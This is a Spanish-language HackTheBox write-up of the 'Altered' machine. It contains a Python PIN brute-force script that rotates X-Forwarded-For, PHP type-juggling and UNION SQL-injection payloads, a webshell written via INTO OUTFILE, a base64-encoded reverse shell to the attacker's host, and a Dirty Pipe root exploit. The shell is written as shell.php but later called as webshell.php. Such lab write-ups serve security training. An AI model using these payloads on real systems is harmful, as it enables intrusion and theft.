+++ 
draft = false
date = 2026-10-30T04:43:33Z
title = "Altered Machine - HackTheBox"
description = "Writeup de Altered (HTB, Hard): bypass de rate limit vía X-Forwarded-For, PHP Type Juggling para romper el control de acceso, SQLi con lectura/escritura de archivos y escalada vía Dirty Pipe."
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = ["HackTheBox Writeups"]
+++

---
- Tags: #Machine #Hard #Linux #SQLi #TypeJuggling #RateLimitBypass #Laravel #DirtyPipe #PHP 
---
# Introducción

**Altered** es una máquina Linux de HackTheBox de dificultad **Hard**. El vector de explotación parte de una aplicación web en Laravel (_UHC March Finals_), donde primero se abusa de la cabecera `X-Forwarded-For` para evadir el rate limiting y forzar por fuerza bruta el PIN de recuperación de contraseña del usuario `admin`. Ya autenticado, un endpoint de perfiles protegido por un parámetro `secret` resulta vulnerable a PHP Type Juggling: al enviarlo como booleano (`true`) dentro de una petición JSON, la comparación floja (`==`) de PHP lo acepta como válido sin importar el hash real, lo que además deja colar una inyección SQL (UNION-based) sobre el parámetro `id`. A través de esta inyección se leen archivos del sistema con `load_file()` y se escribe una webshell con `INTO OUTFILE`, logrando ejecución remota de comandos como `www-data`. La escalada de privilegios se logra explotando la vulnerabilidad de kernel Dirty Pipe (`CVE-2022-0847`) para obtener una shell como `root`.

# Enumeración Nmap

Se realiza un escaneo de puertos abiertos:

```bash
sudo nmap -p- --open -sS --max-rate 2000 -n -Pn 10.129.227.109 -oG allPorts
```

El resultado del escaneo revela únicamente 2 puertos abiertos, correspondientes al 22 y al 80. A continuación se realiza un escaneo de versiones y servicios sobre ambos puertos:

```bash
nmap -p22,80 -sCV 10.129.227.109 -oN portServices
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 20:10 -0400
Nmap scan report for 10.129.227.109
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: UHC March Finals
|_Requested resource was http://10.129.227.109/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
```

Del resultado solo obtenemos los servicios que corren detrás de los puertos; además confirmamos que `nginx` está activo en el puerto 80.

Para profundizar el análisis utilizaremos `whatweb`, de la siguiente forma:

```bash
whatweb http://10.129.227.109
```

```bash
http://10.129.227.109 [302 Found] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.227.109], Laravel, Meta-Refresh-Redirect[http://10.129.227.109/login], RedirectLocation[http://10.129.227.109/login], Title[Redirecting to http://10.129.227.109/login], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], nginx[1.18.0]
http://10.129.227.109/login [200 OK] Bootstrap, Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.227.109], JQuery[1.9.1], Laravel, PasswordField[password], Script[text/javascript], Title[UHC March Finals], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

En el resultado identificamos que la web usa `Laravel`, por lo cual podemos suponer que el lenguaje que corre por detrás es `PHP`.

# Enumeración HTTP

Al ingresar a la página web nos encontramos con un `/login`, que nos solicita `name` y `password`.

<img src="/images/Pasted image 20261029211649.png" style="width:100%; height:auto; display:block; margin:auto;">

Como no tenemos credenciales, podemos probar con `test:test`, a lo cual nos aparece un apartado de `Forgot Password?` y el mensaje `Invalid Username`.

<img src="/images/Pasted image 20261029211903.png" style="width:100%; height:auto; display:block; margin:auto;">

Si probamos con las credenciales `admin:admin`, encontramos que el mensaje de error es diferente: `Invalid Password`. Por lo cual tenemos una vía para realizar `user enumeration`.

<img src="/images/Pasted image 20261029211914.png" style="width:100%; height:auto; display:block; margin:auto;">

Si vamos al apartado de `/reset` y probamos reiniciar la contraseña de `admin`, nos aparece que el `pin` ha sido enviado al correo, y como ejemplo se muestra un código de 4 dígitos.

<img src="/images/Pasted image 20261029212008.png" style="width:100%; height:auto; display:block; margin:auto;">

Si interceptamos esta petición con `Burpsuite`, tenemos la siguiente petición:

```http
POST /api/resettoken HTTP/1.1
Host: 10.129.227.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://10.129.227.109
X-Forwarded-For: 203.0.113.19
Connection: keep-alive
Referer: http://10.129.227.109/reset
Cookie: XSRF-TOKEN=eyJpdiI6ImVuRlBKQ2kwNGlJeEhpODJhakVXTXc9PSIsInZhbHVlIjoiRzZWeWVZQzRMZnlZdjVWZ3NUNXRLNzRSMjRFZDZzTHA5ckxhVnBpdXhyWjN6Z2NnZHVvdG9COTBIRmo0dW4rYXE5dklzTUFMVHlBT3pCYTZ2YkV5ZGJ5R1lUOE1BcHB2K0w2OXRtdkN1ZlFScWJEZHpXYzJzU29lOTZ2MGpYdEQiLCJtYWMiOiIyMjdhNjRiNTU3MzY3OGQ1Y2ExYTg2ODI5M2Q1YjNhZjdlZWZhYjI2YjZkZDdjM2NhNDNiYzM1Zjc5OTA5YjAxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkQxSktxZGtBOURFOXlpTlVyVXlwdlE9PSIsInZhbHVlIjoiUElXOW5DWHAxSkVwdkNNVVV4SG16cWhob1BzLzlCcFRubHUzRDhKY0JRdkU5NFZ3eVZYSEZFdG8yanhGZnF6cVp4eWNVSGdvL2pzYjhtV1orR2tnazQ4SEY5OTYxcmltQitua2ZrTTgyVzVlK1UrRWpIRjc3M2hKejZwWGREWWEiLCJtYWMiOiJiYWUzMGM1MDc5OTliMjhmYWRiMTI2Y2ZhNWZhMzY0ZTkxYjk0YmI0NjE5MDk3M2FhZjJmNTE1ZWY2YzBlNDczIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=admin&pin=1234
```

Lo revelador es la respuesta de la web: en las cabeceras tenemos lo siguiente.

El valor relevante es `X-RateLimit-Limit: 60` y `X-RateLimit-Remaining: 59`.

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Fri, 30 Oct 2026 00:15:22 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 59
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6ImJybkk4MDFDS3VvNXB2anZObDBEclE9PSIsInZhbHVlIjoiaXlNOWdKWFFQdllFSjhBTitDbDVHaGJEK0RrZkErOE9VQ3RHRmY5clV4c0xYMVE5T00xQStaeHpob2RCTW40dDlKWnIrVks2OWZYdE5hWHVZUmhhMlV3aHdXVjRkc0F5bXhvOW1mMU9DQU55K0Q5SktWOHo3WDRDY0VrT3h2SXoiLCJtYWMiOiIzNjBlN2Q5NTIxNzc3OGNmYjQ0ZWQxMTIzOGM0OGRlYmY5MTFhNTgzMjNlMjFiOTJjOTIzNWY5NzZiYzc0MjBiIiwidGFnIjoiIn0%3D; expires=Fri, 30-Oct-2026 02:15:22 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 5650
```

Si volvemos a reenviar la petición anterior, vemos que la cabecera `X-RateLimit-Remaining` decrementa en 1, por lo cual podemos inferir que tenemos como límite 60 intentos:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Fri, 30 Oct 2026 00:21:51 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 58
Access-Control-Allow-Origin: *
```

# Bypass de Rate Limit

Si queremos realizar un `bypass` de este `rate limit`, podemos agregar la cabecera:
`X-Forwarded-For`.

> **¿Qué es `X-Forwarded-For`?** La cabecera HTTP `X-Forwarded-For` (XFF) sirve para identificar la dirección IP original del cliente que realiza una petición HTTP cuando esta pasa a través de uno o varios intermediarios, como un proxy inverso, balanceador de carga o CDN. Si la aplicación confía ciegamente en esta cabecera para aplicar el rate limiting por IP, basta con rotar su valor para resetear el contador.

Si ahora volvemos a ver la cabecera `X-RateLimit-Remaining` usando una IP nueva en la cabecera XFF, vemos que esta se reinicia. Por lo cual tenemos una vía para realizar un ataque de fuerza bruta y encontrar el `pin` del usuario `admin`.

Un script en Python que realiza el ataque de fuerza bruta hacia el `pin` es el siguiente.

**Nota:** el `Content-Length` de la respuesta por defecto es `5650` (pin incorrecto), por lo cual filtramos por ese valor para encontrar el `pin` válido.

Primero creamos el entorno virtual de Python e instalamos las dependencias:

```bash
python3 -m venv venv
source venv/bin/activate
pip3 install requests
pip3 install pwn
nano brutef_pin.py
```

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from pwn import log, context

context.log_level = "info"

URL         = "http://10.129.227.109/api/resettoken"
IGNORE_LEN  = 5650
THREADS     = 20
TOTAL       = 10000
TIMEOUT     = 10

COOKIES = {
    "XSRF-TOKEN": "eyJpdiI6ImVuRlBKQ2kwNGlJeEhpODJhakVXTXc9PSIsInZhbHVlIjoiRzZWeWVZQzRMZnlZdjVWZ3NUNXRLNzRSMjRFZDZzTHA5ckxhVnBpdXhyWjN6Z2NnZHVvdG9COTBIRmo0dW4rYXE5dklzTUFMVHlBT3pCYTZ2YkV5ZGJ5R1lUOE1BcHB2K0w2OXRtdkN1ZlFScWJEZHpXYzJzU29lOTZ2MGpYdEQiLCJtYWMiOiIyMjdhNjRiNTU3MzY3OGQ1Y2ExYTg2ODI5M2Q1YjNhZjdlZWZhYjI2YjZkZDdjM2NhNDNiYzM1Zjc5OTA5YjAxIiwidGFnIjoiIn0%3D",
    "laravel_session": "eyJpdiI6IkQxSktxZGtBOURFOXlpTlVyVXlwdlE9PSIsInZhbHVlIjoiUElXOW5DWHAxSkVwdkNNVVV4SG16cWhob1BzLzlCcFRubHUzRDhKY0JRdkU5NFZ3eVZYSEZFdG8yanhGZnF6cVp4eWNVSGdvL2pzYjhtV1orR2tnazQ4SEY5OTYxcmltQitua2ZrTTgyVzVlK1UrRWpIRjc3M2hKejZwWGREWWEiLCJtYWMiOiJiYWUzMGM1MDc5OTliMjhmYWRiMTI2Y2ZhNWZhMzY0ZTkxYjk0YmI0NjE5MDk3M2FhZjJmNTE1ZWY2YzBlNDczIiwidGFnIjoiIn0%3D",
}

HEADERS_BASE = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.129.227.109",
    "Referer": "http://10.129.227.109/reset",
}

lock       = Lock()
stop_event = Event()
done_count = 0
found_pin  = None

prog = log.progress("Fuzzing PIN")


def attempt(i: int):
    """Envía una petición con el PIN i. Rotación XFF: bloque = i // 50."""
    if stop_event.is_set():
        return None

    pin = f"{i:04d}"
    xff = f"10.10.10.{10 + i // 50}"

    headers = HEADERS_BASE.copy()
    headers["X-Forwarded-For"] = xff
    data = f"name=admin&pin={pin}"

    try:
        r = requests.post(URL, headers=headers, cookies=COOKIES,
                          data=data, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ("error", i, pin, str(e))

    global done_count
    with lock:
        done_count += 1
        if done_count % 25 == 0:
            prog.status(f"{done_count}/{TOTAL} peticiones")

    if len(r.text) == IGNORE_LEN:
        return ("ignored", i, pin, None)
    return ("hit", i, pin, (r.status_code, r.text))


with ThreadPoolExecutor(max_workers=THREADS) as ex:
    futures = {ex.submit(attempt, i): i for i in range(TOTAL)}

    for fut in as_completed(futures):
        res = fut.result()
        if res is None:
            continue
        kind, i, pin, payload = res

        if kind == "ignored":
            continue
        if kind == "error":
            log.warning(f"[{i}] pin={pin} error: {payload}")
            continue

        status, body = payload
        print(f"\n[+] pin={pin}  status={status}  len={len(body)}")
        print(body[:500])

        if status == 200:
            found_pin = pin
            stop_event.set()
            break

    for f in futures:
        f.cancel()

if found_pin:
    prog.success(f"PIN encontrado: {found_pin}")
else:
    prog.failure("PIN no encontrado")
```

El script envía las peticiones en paralelo (`ThreadPoolExecutor`), rotando la cabecera `X-Forwarded-For` cada 50 intentos para evitar el rate limit, y descarta las respuestas cuyo tamaño coincide con el de un PIN inválido. Encontramos así el `pin` válido: `2798`.

```bash
[+] Fuzzing PIN: PIN encontrado: 2798

[+] pin=2798  status=200  len=5372
<!doctype html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang=""> <!--<![endif]-->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>UHC March Finals</title>
    <meta name="description" content="UHC March Fi
```

Ahora, en `/api/resettoken` podemos cambiar la contraseña y luego iniciar sesión como `admin`.

<img src="/images/Pasted image 20261029215217.png" style="width:100%; height:auto; display:block; margin:auto;">

# Control de acceso en /api/getprofile

Ya autenticados, la aplicación nos permite ver el perfil de los participantes en una lista. Al interceptar la petición tenemos lo siguiente:

```http
GET /api/getprofile?id=1&secret=89cb389c73f667c5511ce169033089cb HTTP/1.1
Host: 10.129.227.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://10.129.227.109/
Cookie: XSRF-TOKEN=eyJpdiI6IlQwVCtoMFVaMzNpWVdqUmpKWTU3RlE9PSIsInZhbHVlIjoiZ05tZjdjQmZNa2FUR2o2YzZhU2dsOWtxN2pnUy9nRVNxbDZNcDlvRTBFOTc5eDl0ZHhsRFFmenE2UnZBWUFpNXgwYnd6Y1FXSUQ1NmVkd3lJRFVlUE92cFpIaTlvTDBqVitwVG1CaXQrbFNiTlEwQnY5cTdhQWQxV0tROUpiQXEiLCJtYWMiOiJjMDE1MjgzYWVlNDRkNmM2NzJhMDU0ZDk5M2EwOGJlM2ZhMzhjOWVjOGYxY2I1NmI2ZmU0ZWY4ZDJkMDZkZTA0IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImF4RkNzb3cxQmFnbjZ3WWJsd3RBcUE9PSIsInZhbHVlIjoibTVTUXp2N3hCNm5YaHhsLzJNTUNTNUE5Z0pDRnduL29tZE9OaXBuZ2dOcmRBdlBhY2orb1ZDeEtodHNNSUxYd1VqWDhPL2ZPUHA5bnhtNDMyMFJsaDVnOHVJV2sxRkZ5Z3NnNkJ0Q0szQWo5R0xVeHJmZlAwVEw0aFYxRGwwemMiLCJtYWMiOiI0YTU5MTAxYWQwYTYwOTgzYjVmNzk1MzFlZGI5YjQzOTYzYTMwYWExNzQ1NTE3Y2M5Nzc5MDg3ZWE3ODgzNDA3IiwidGFnIjoiIn0%3D
Priority: u=0
```

Y vemos la siguiente respuesta para `id=1`:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Fri, 30 Oct 2026 00:51:11 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 58
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6InZ5cVhUcC9sTFRjZnN3SzcvREhyVWc9PSIsInZhbHVlIjoiaUhXdnEwUEtjVmo3NjJ1RHNIU2I4UGtySkcrOTNpeGdTM1p5dTl6T3lBcThzb3Z3T0hjMWVDd1A1WmZvdDZ1S1BZWVl6TUtPOVZsV2prWDk3VUd3aFpGMXNjMmNuazJhTTRxUnZwSUE0dGpkbmhCOU91QlFPWG42dnRISWhGQmsiLCJtYWMiOiIyZDM1MTUzMzI1OTk3ZDQwM2YyZjA3NzAzZWM3MmI4OTcwZWY5YjViNDEzODYxN2Q1NmIxNTBlNzFkOGRhMjI2IiwidGFnIjoiIn0%3D; expires=Fri, 30-Oct-2026 02:51:11 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 280

Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season 1 Tournament, there isn't much footage for others to study. The only thing players can gather about this guy is what is on his <a href="bigous.me">blog</a> and that he can hack.
```

Si cambiamos el `id` a `2`, nos muestra el siguiente mensaje:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Fri, 30 Oct 2026 00:53:30 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 57
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6IlVKYlNyU2pGeFJKYzdFNTFUQTlaYlE9PSIsInZhbHVlIjoiajFjN0Rveno3WFdadW56U1BwZlVCWWZsV2hNaFNCRmlDTjRqeXhSVW9mby9Jcm1FbnNLTm16QWNBR0x2Y08xRE9pdkd5b0lpN1BncjFVN3dsU29GbnozNERxejBSNDduMGRiS3dTcytBVk5QYkFmM2pZdWx2OUFQaDJVRE5rWmoiLCJtYWMiOiI1ZjdjZjE5ZjM3MzZjNmI4NmY1YmFkNzhiNDZjNjAzZDA1NWE5ZDg1ZjJlOGMwMjA1MWUzOGRiYmJlMThlNGM4IiwidGFnIjoiIn0%3D; expires=Fri, 30-Oct-2026 02:53:30 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 28

Tampered user input detected
```

El mensaje `Tampered user input detected` indica que el servidor valida el parámetro `secret` contra el `id` solicitado (probablemente comparando contra un hash conocido con el operador flojo `==` de PHP). No es un IDOR "puro" —hay un control pensado para evitarlo—, pero como se ve a continuación, ese control se puede saltar explotando cómo PHP compara tipos distintos (**Type Juggling**).

# Bypass vía Content-Type JSON + PHP Type Juggling

Si enviamos los mismos parámetros `id=1` y `secret=89cb389c73f667c5511ce169033089cb`, pero como JSON —cambiando el `Content-Type` a `application/json`— la aplicación procesa igualmente la petición:

```bash
Content-Type: application/json
Content-Length: 54

{
    "id":"1",
    "secret":"89cb389c73f667c5511ce169033089cb"
}
```

Y vemos que la web procesa bien los datos:

```bash
Content-Length: 280

Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season 1 Tournament, there isn't much footage for others to study. The only thing players can gather about this guy is what is on his <a href="bigous.me">blog</a> and that he can hack.
```

Esto es relevante porque el formato JSON permite enviar `secret` con un tipo de dato distinto a texto. Si en lugar del hash real probamos `"secret": true` (booleano), la petición también se procesa como válida:

```json
{
    "id":"1",
    "secret":true
}
```

Esto confirma un caso clásico de **PHP Type Juggling**: con el operador de comparación floja (`==`), PHP convierte el booleano `true` y cualquier string no vacío (ni `"0"`) al mismo tipo antes de compararlos, por lo que `true == "<hash>"` se evalúa como verdadero sin importar cuál sea el hash real. A partir de aquí ya no necesitamos conocer el `secret` correcto: basta con enviar `secret: true` en cada petición JSON —como se ve en los payloads de inyección SQL a continuación— para saltarnos por completo esa validación. Esto, sumado a que el filtro de inyección (que bloqueaba comillas simples en `application/x-www-form-urlencoded`) tampoco se aplica al cuerpo JSON —probablemente porque Laravel enruta cada formato a un parser distinto—, nos abre la puerta a inyectar SQL directamente sobre el parámetro `id`.

# Explotando SQL Injection

Ahora podemos probar a insertar un `order by` para ver si la web lo interpreta:

```json
{
    "id":"1' order by 1--+-",
    "secret":"89cb389c73f667c5511ce169033089cb"
}
```

Y vemos que la web nos responde con:

```json
{
    "message": "Server Error"
}
```

Pero si quitamos la comilla simple `'` y el comentario `--+-`:

```json
{
    "id":"1 order by 1",
    "secret":"89cb389c73f667c5511ce169033089cb"
}
```

Vemos que la web responde con normalidad:

```bash
Content-Length: 280

Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season 1 Tournament, there isn't much footage for others to study. The only thing players can gather about this guy is what is on his <a href="bigous.me">blog</a> and that he can hack.
```

De esta forma podemos descubrir que la consulta SQL detrás utiliza 3 columnas.

Si probamos el siguiente payload, vemos que el valor `3` se refleja en la web, por lo cual lo podemos utilizar para exfiltrar información:

```json
{
    "id":"100 union select 1,2,'Celero0'",
    "secret":true
}
```

```bash
Content-Length: 1

Celero0
```

## Leer archivos mediante SQLi

Dependiendo de los permisos que tenga el usuario de la base de datos, a veces podemos llegar a leer archivos de la máquina víctima. Para ello usamos la función `load_file('')`. Para leer `/etc/passwd`, aplicamos el siguiente payload:

```json
{"id":"100 union select 1,2,load_file('/etc/passwd')","secret":true}
```

La web responde con lo siguiente:

```bash
Content-Length: 1816

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
```

Ahora leemos un archivo importante para obtener información de `nginx`, el archivo de configuración de sitios habilitados, con el siguiente payload:

```json
{"id":"100 union select 1,2,load_file('/etc/nginx/sites-enabled/default')","secret":true}
```

Obtenemos como respuesta la ruta donde corre la web: `/srv/altered/public`:

```bash
Content-Length: 865

server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /srv/altered/public;

    add_header X-Frame-Options "SAMEORIGIN";
    add_header X-Content-Type-Options "nosniff";

    set $realip $remote_addr;
    if ($http_x_forwarded_for ~ "^(\d+\.\d+\.\d+\.\d+)") {
        set $realip $1;
    }
```

## Escribir archivos mediante SQLi

Sabiendo la ruta donde se aloja la web, podemos intentar subir una webshell. Como vimos antes que la web usa Laravel, podemos inferir que por detrás se interpreta el lenguaje PHP, por lo cual el siguiente payload sube una webshell mediante `INTO OUTFILE`:

```json
Content-Type: application/json
Content-Length: 89

{
    "id":"100 union select '1','2','<?php system($_REQUEST[0]); ?>' into outfile '/srv/altered/public/shell.php",
    "secret":true
}
```

El mensaje de la web es un error, pero eso no necesariamente significa que el archivo no se haya subido:

```json
{
    "message": "Server Error"
}
```

Por lo cual verificamos con un simple `curl`:

```bash
curl 'http://10.129.227.109/webshell.php?0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data),117(mysql)
```

Ya con acceso a ejecución remota de comandos, podemos conseguir una reverse shell. Para ello nos ponemos en escucha con `penelope` en el puerto `4444`:

```bash
penelope 4444
```

Y enviamos la reverse shell con el siguiente comando:

```bash
curl 'http://10.129.227.109/webshell.php?0=printf+KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDgvNDQ0NCAwPiYxKSAm|base64+-d|bash'
```

```bash
[+] [New Reverse Shell] => altered 10.129.227.109 Linux-x86_64 
www-data(33) Session ID <1>
[+] Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/celero0/.penelope/sessions/altered~10.129.227.109-Linux-x86_64/2026_10_29-23_18_41-880-www-data(33).log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@altered:/srv/altered/public$
```

# Escalada de privilegios

Ya con la consola, podemos ir a `/home/htb/` y leer `user.txt`:

```bash
www-data@altered:~$ cd /home/htb/
www-data@altered:/home/htb$ cat user.txt 
81cfb4d3e5f2db0668220fb159ba6a1b
```

Buscando vías para escalar privilegios, encontramos que el kernel de la máquina es vulnerable a **Dirty Pipe** (`CVE-2022-0847`):

```bash
www-data@altered:/home/htb$ uname -r
5.16.0-051600-generic
```

Para explotarlo, descargamos el siguiente exploit en C:

```bash
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/refs/heads/main/exploit.c
```

Lo compilamos en nuestra máquina atacante:

```bash
gcc exploit.c -o exploit
```

Y lo transferimos a la máquina víctima para ejecutarlo:

```bash
www-data@altered:/tmp$ wget 10.10.14.48/exploit-2
--2026-10-30 04:01:26--  http://10.10.14.48/exploit-2
Connecting to 10.10.14.48:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘exploit-2’

exploit-2                                                  100%[=======================================================================================================================================>]  17.62K   114KB/s    in 0.2s     

2026-10-30 04:01:27 (114 KB/s) - ‘exploit-2’ saved [18040/18040]

www-data@altered:/tmp$ chmod +x exploit-2
www-data@altered:/tmp$ ./exploit-2
Usage: ./exploit-2 SUID
www-data@altered:/tmp$ ./exploit-2 /usr/bin/pkexec
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data),117(mysql)
```

El exploit abusa de **Dirty Pipe** para sobrescribir el contenido de un binario con permiso SUID (`pkexec`) en memoria sin modificar sus permisos en disco, inyectando un shellcode que al ejecutarse concede una shell con privilegios de `root`.

Finalmente vamos a `/root` y leemos `root.txt`:

```bash
root@altered:/tmp# cd /root/
root@altered:/root# cat root.txt 
619f436a829aba601cebb691790551a1
```

# Conclusión

En **Altered**, el punto de entrada no está en una falla evidente de la aplicación, sino en una cabecera de confianza mal gestionada: al confiar `X-Forwarded-For` como origen real del cliente para aplicar el rate limiting, es posible rotarla y forzar por fuerza bruta el PIN de `/api/resettoken` sin restricciones, hasta recuperar el acceso de `admin`.

Desde ahí, un endpoint de perfiles (`/api/getprofile`) protegido por un parámetro `secret` resulta vulnerable a **PHP Type Juggling**: al enviarlo como booleano `true` dentro de una petición `application/json` en lugar de como cadena, la comparación floja (`==`) de PHP lo evalúa como verdadero frente a cualquier hash, saltándose por completo la validación —y, de paso, el filtro que bloqueaba caracteres de inyección SQL en el cuerpo `form-urlencoded`—. Esto habilita una inyección UNION-based sobre el parámetro `id`, con la que se lee `/etc/passwd` y la configuración de `nginx` mediante `load_file()`, y se escribe una webshell en `/srv/altered/public/shell.php` mediante `INTO OUTFILE`, logrando ejecución remota de comandos como `www-data`.

Para la escalada a `root`, el kernel de la máquina (`5.16.0-051600-generic`) resulta vulnerable a **Dirty Pipe** (`CVE-2022-0847`); explotarlo sobre el binario SUID `pkexec` permite sobrescribir su contenido en memoria sin alterar sus permisos en disco, obteniendo una shell con privilegios de `root`.

En resumen, la máquina pone a prueba el abuso de cabeceras de confianza para evadir controles de rate limiting, la explotación de fallas de comparación de tipos en PHP (Type Juggling) para romper controles de acceso, la inyección SQL para lectura y escritura arbitraria de archivos, y la explotación de una vulnerabilidad de kernel conocida para escalar privilegios.
